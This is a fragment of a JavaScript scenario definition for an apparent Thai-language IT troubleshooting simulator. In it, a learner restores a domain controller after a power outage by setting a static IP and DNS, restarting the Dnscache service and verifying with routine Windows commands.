    caller: 'ผู้บริหาร',
    story: 'เช้าวันจันทร์หลังไฟดับเมื่อคืน: พนักงานล็อกอินไม่ได้ และเครือข่ายชั้น 2 ก็ใช้ไม่ได้ ไม่มีใครรู้ว่าสองเรื่องนี้เกี่ยวกันหรือไม่ ผู้บริหารยืนรออยู่ข้างหลังคุณ',
    impact: 'ทั้งองค์กรหยุดทำงาน — และยังไม่รู้ด้วยซ้ำว่ามีกี่ปัญหา',
    device: 'windows-gui',
    init: {
      hostname: 'SRV-DC01', openApps: ['servermanager'],
      apply: st => {
        st.domain = 'corp.local'; st.isDC = true;
        st.features.add('AD-Domain-Services'); st.features.add('DNS');
        st.dnsZones.push({ name: 'corp.local', type: 'Primary', dynamic: 'Secure' });
        st.adGroups['Domain Users'] = ['Administrator'];
        // ไฟดับทำให้การ์ดกลับไปเป็น DHCP และ service ที่ไม่ได้ตั้ง auto ไม่ขึ้น
        st.nics.Ethernet0.dhcp = true;
        st.nics.Ethernet0.ip = '169.254.11.9';
        st.nics.Ethernet0.gw = '';
        st.nics.Ethernet0.dns = [];
        st.services.Dnscache.status = 'Stopped';
        st.services.Dnscache.start = 'Manual';
      },
    },
    tasks: [
      { t: 'เปิด <b>Command Prompt</b> ตรวจสถานะเครือข่ายก่อน', hint: 'ดับเบิลคลิกไอคอน Command Prompt', check: (s, h) => said(h, /gui:open:cmd/) },
      { t: 'ดูการตั้งค่า IP — เจอ 169.254.x.x คือได้ IP จาก DHCP ไม่ได้', hint: 'พิมพ์ ipconfig /all', check: (s, h) => said(h, /^ipconfig\s*\/all/i) },
      { t: 'เปิด <b>Network Connections</b>', hint: 'ดับเบิลคลิกไอคอน Network Connections', check: (s, h) => said(h, /gui:open:ncpa\.cpl/) },
      {
        t: '<b>แก้ที่ 1:</b> ตั้ง IP static กลับเป็น <code>192.168.10.5</code> / <code>255.255.255.0</code> / gw <code>192.168.10.1</code>',
        hint: 'Properties → Use the following IP address → กรอกค่า → OK',
        check: s => s.nics.Ethernet0.ip === '192.168.10.5' && !s.nics.Ethernet0.dhcp,
      },
      { t: '<b>แก้ที่ 2:</b> ตั้ง DNS ของ DC ให้ชี้ที่ตัวเอง <code>192.168.10.5</code>', hint: 'ในหน้าเดียวกัน ใส่ Preferred DNS server = 192.168.10.5', check: s => s.nics.Ethernet0.dns[0] === '192.168.10.5' },
      { t: 'เปิด <b>Services</b> ตรวจ service ที่ไม่ได้ขึ้นหลังไฟดับ', hint: 'ดับเบิลคลิกไอคอน Services', check: (s, h) => said(h, /gui:open:services\.msc/) },
      { t: '<b>แก้ที่ 3:</b> Start service <code>Dnscache</code>', hint: 'กด Start ที่แถว Dnscache', check: s => s.services.Dnscache.status === 'Running' },
      { t: 'ตั้ง Startup Type ของ <code>Dnscache</code> เป็น <code>Automatic</code> ไม่ให้เกิดซ้ำ', hint: 'เลือก Automatic ที่ Dnscache', check: s => s.services.Dnscache.start === 'Automatic' },
      { t: 'ล้าง DNS cache ที่ค้างค่าเก่า', hint: 'ที่ Command Prompt พิมพ์ ipconfig /flushdns', check: (s, h) => said(h, /ipconfig\s*\/flushdns/i) },
      { t: 'ลงทะเบียนชื่อกับ DNS ใหม่', hint: 'พิมพ์ ipconfig /registerdns', check: (s, h) => said(h, /ipconfig\s*\/registerdns/i) },
      { t: 'ทดสอบว่าถึง gateway แล้ว', hint: 'พิมพ์ ping 192.168.10.1', check: (s, h) => said(h, /^ping\s+192\.168\.10\.1/i) },
      { t: 'ตรวจว่าแปลงชื่อโดเมนได้แล้ว', hint: 'พิมพ์ nslookup corp.local', check: (s, h) => said(h, /^nslookup/i) },
      { t: 'ตรวจว่า AD ตอบสนอง — เปิด <b>ADUC</b>', hint: 'ดับเบิลคลิกไอคอน Active Directory Users and Computers', check: (s, h) => said(h, /gui:open:dsa\.msc/) },
      { t: 'บังคับให้ policy อัปเดตเพื่อยืนยันว่าใช้งานได้จริง', hint: 'ที่ Command Prompt พิมพ์ gpupdate /force', check: (s, h) => said(h, /gpupdate/i) },
      { t: 'เปิด <b>Event Viewer</b> ตรวจว่ามีอะไรผิดปกติเหลืออีกไหม', hint: 'ดับเบิลคลิกไอคอน Event Viewer', check: (s, h) => said(h, /gui:open:eventvwr/) },
    ],
    debrief: 'บทเรียนที่สำคัญที่สุดของเคสนี้คือ <b>"อย่าสมมติว่ามีปัญหาเดียว"</b> — ที่นี่มีสามปัญหาซ้อนกันจากเหตุเดียว (ไฟดับ): IP กลายเป็น DHCP, DNS ว่าง, และ service ที่ตั้งเป็น Manual ไม่ขึ้นเอง หลายคนแก้เจอปัญหาแรกแล้วคิดว่าจบ ทำให้เสียเวลาไปอีกรอบ <b>วิธีที่ถูกคือไล่ตรวจให้ครบทุกชั้นก่อนสรุป</b> (L1 การ์ด → L3 IP/DNS → service → application) และหลังไฟดับทุกครั้งควรมี checklist ตรวจระบบสำคัญทั้งหมด ไม่ใช่รอให้ผู้ใช้โทรมาแจ้งทีละเรื่อง',
  },
];
